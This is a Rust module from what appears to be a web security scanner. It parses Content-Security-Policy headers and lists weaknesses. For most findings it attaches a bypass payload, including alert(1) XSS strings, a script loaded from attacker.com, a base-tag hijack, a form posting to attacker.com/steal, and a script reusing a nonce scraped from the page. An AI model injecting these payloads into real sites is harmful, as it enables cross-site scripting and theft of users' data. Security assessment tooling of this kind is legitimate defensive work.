use std::collections::HashMap;

#[derive(Debug, Clone)]
pub struct CspPolicy {
    pub directives: HashMap<String, Vec<String>>,
    pub raw: String,
}

#[derive(Debug, Clone)]
pub struct CspWeakness {
    pub directive: String,
    pub description: String,
    pub severity: WeaknessSeverity,
    pub bypass_payload: Option<String>,
}

#[derive(Debug, Clone, PartialEq)]
pub enum WeaknessSeverity {
    Critical,
    High,
    Medium,
    Low,
}

#[derive(Debug, Clone)]
pub struct CspAnalysis {
    pub policy: CspPolicy,
    pub weaknesses: Vec<CspWeakness>,
    pub blocks_inline_scripts: bool,
    pub blocks_eval: bool,
    pub has_nonce: bool,
    pub nonce_value: Option<String>,
}

impl CspPolicy {
    pub fn parse(header: &str) -> Self {
        let mut directives = HashMap::new();
        for directive in header.split(';') {
            let parts: Vec<&str> = directive.trim().splitn(2, char::is_whitespace).collect();
            if parts.is_empty() {
                continue;
            }
            let name = parts[0].to_lowercase();
            let values: Vec<String> = if parts.len() > 1 {
                parts[1].split_whitespace().map(|s| s.to_string()).collect()
            } else {
                Vec::new()
            };
            directives.insert(name, values);
        }
        Self {
            directives,
            raw: header.to_string(),
        }
    }

    pub fn get_directive(&self, name: &str) -> Option<&Vec<String>> {
        self.directives
            .get(name)
            .or_else(|| self.directives.get("default-src"))
    }

    pub fn has_directive(&self, name: &str) -> bool {
        self.directives.contains_key(name)
    }
}

pub fn analyze_csp(header: &str, page_html: Option<&str>) -> CspAnalysis {
    let policy = CspPolicy::parse(header);
    let mut weaknesses = Vec::new();

    let script_src = policy.get_directive("script-src");
    let default_src = policy.directives.get("default-src");
    let effective_script = script_src.or(default_src);

    // Check unsafe-inline
    let has_unsafe_inline = effective_script
        .map_or(false, |v| v.iter().any(|s| s == "'unsafe-inline'"));

    if has_unsafe_inline {
        weaknesses.push(CspWeakness {
            directive: "script-src".to_string(),
            description: "'unsafe-inline' allows inline <script> tags and event handlers".to_string(),
            severity: WeaknessSeverity::Critical,
            bypass_payload: Some("<script>alert(1)</script>".to_string()),
        });
    }

    // Check unsafe-eval
    let has_unsafe_eval = effective_script
        .map_or(false, |v| v.iter().any(|s| s == "'unsafe-eval'"));

    if has_unsafe_eval {
        weaknesses.push(CspWeakness {
            directive: "script-src".to_string(),
            description: "'unsafe-eval' allows eval(), Function(), setTimeout(string)".to_string(),
            severity: WeaknessSeverity::High,
            bypass_payload: Some("<img src=x onerror=\"eval('alert(1)')\">".to_string()),
        });
    }

    // Check wildcard
    let has_wildcard = effective_script
        .map_or(false, |v| v.iter().any(|s| s == "*"));

    if has_wildcard {
        weaknesses.push(CspWeakness {
            directive: "script-src".to_string(),
            description: "Wildcard '*' allows loading scripts from any origin".to_string(),
            severity: WeaknessSeverity::Critical,
            bypass_payload: Some("<script src='https://attacker.com/xss.js'></script>".to_string()),
        });
    }

    // Check data: URI
    let has_data = effective_script
        .map_or(false, |v| v.iter().any(|s| s == "data:"));

    if has_data {
        weaknesses.push(CspWeakness {
            directive: "script-src".to_string(),
            description: "'data:' allows data URI script injection".to_string(),
            severity: WeaknessSeverity::High,
            bypass_payload: Some("<script src='data:text/javascript,alert(1)'></script>".to_string()),
        });
    }

    // Check blob:
    let has_blob = effective_script
        .map_or(false, |v| v.iter().any(|s| s == "blob:"));

    if has_blob {
        weaknesses.push(CspWeakness {
            directive: "script-src".to_string(),
            description: "'blob:' allows blob URL script injection".to_string(),
            severity: WeaknessSeverity::Medium,
            bypass_payload: None,
        });
    }

    // Check missing base-uri
    if !policy.has_directive("base-uri") {
        weaknesses.push(CspWeakness {
            directive: "base-uri".to_string(),
            description: "Missing base-uri allows <base> tag injection to hijack relative URLs".to_string(),
            severity: WeaknessSeverity::Medium,
            bypass_payload: Some("<base href='https://attacker.com/'>".to_string()),
        });
    }

    // Check missing form-action
    if !policy.has_directive("form-action") {
        weaknesses.push(CspWeakness {
            directive: "form-action".to_string(),
            description: "Missing form-action allows form submission to attacker-controlled URLs".to_string(),
            severity: WeaknessSeverity::Medium,
            bypass_payload: Some("<form action='https://attacker.com/steal'><input type=submit></form>".to_string()),
        });
    }

    // Check for JSONP-exploitable CDN domains
    let jsonp_domains = [
        "*.googleapis.com", "*.google.com", "*.gstatic.com",
        "*.cloudflare.com", "*.jsdelivr.net", "*.unpkg.com",
        "*.cdnjs.cloudflare.com", "*.ajax.googleapis.com",
    ];

    if let Some(sources) = effective_script {
        for source in sources {
            for jsonp_domain in &jsonp_domains {
                if source.contains(jsonp_domain.trim_start_matches('*')) {
                    weaknesses.push(CspWeakness {
                        directive: "script-src".to_string(),
                        description: format!("'{}' may host JSONP endpoints exploitable for CSP bypass", source),
                        severity: WeaknessSeverity::High,
                        bypass_payload: None,
                    });
                    break;
                }
            }
        }
    }

    // Detect nonces
    let mut has_nonce = false;
    let mut nonce_value = None;

    if let Some(sources) = effective_script {
        for source in sources {
            if source.starts_with("'nonce-") {
                has_nonce = true;
                // Also try to find the nonce in the page HTML
                if let Some(html) = page_html {
                    let nonce_str = source.trim_matches('\'').trim_start_matches("nonce-");
                    if html.contains(nonce_str) {
                        nonce_value = Some(nonce_str.to_string());
                        weaknesses.push(CspWeakness {
                            directive: "script-src".to_string(),
                            description: format!("Nonce '{}' found in page source — can be reused for injection", nonce_str),
                            severity: WeaknessSeverity::Critical,
                            bypass_payload: Some(format!("<script nonce='{}'>alert(1)</script>", nonce_str)),
                        });
                    }
                }
                break;
            }
        }
    }

    let blocks_inline = !has_unsafe_inline && !has_wildcard && effective_script.is_some();
    let blocks_eval = !has_unsafe_eval && effective_script.is_some();

    CspAnalysis {
        policy,
        weaknesses,
        blocks_inline_scripts: blocks_inline,
        blocks_eval,
        has_nonce,
        nonce_value,
    }
}

/// Generate a brief summary of CSP weaknesses for the Finding
pub fn csp_summary(analysis: &CspAnalysis) -> String {
    if analysis.weaknesses.is_empty() {
        return "CSP: No weaknesses found".to_string();
    }

    let critical = analysis.weaknesses.iter().filter(|w| w.severity == WeaknessSeverity::Critical).count();
    let high = analysis.weaknesses.iter().filter(|w| w.severity == WeaknessSeverity::High).count();

    format!(
        "CSP: {} weaknesses ({} critical, {} high)",
        analysis.weaknesses.len(),
        critical,
        high
    )
}
